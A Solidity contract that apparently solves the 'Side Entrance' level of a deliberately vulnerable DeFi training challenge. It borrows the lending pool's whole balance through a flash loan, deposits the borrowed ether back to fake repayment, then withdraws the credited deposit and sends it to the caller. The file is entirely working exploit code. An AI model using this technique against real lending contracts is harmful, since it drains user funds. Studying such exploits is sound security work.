// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface ISideEntranceLenderPool {
    function deposit() external payable;

    function withdraw() external;

    function flashLoan(uint256 amount) external;
}

contract Attack {
    ISideEntranceLenderPool pool;

    constructor(ISideEntranceLenderPool _pool) {
        pool = _pool;
    }

    function attack() external {
        pool.flashLoan(address(pool).balance);
        pool.withdraw();

        (bool success, ) = payable(msg.sender).call{
            value: address(this).balance
        }("");
        require(success, "Attack: ether transfer failed.");
    }

    function execute() external payable {
        pool.deposit{value: address(this).balance}();
    }

    receive() external payable {}
}
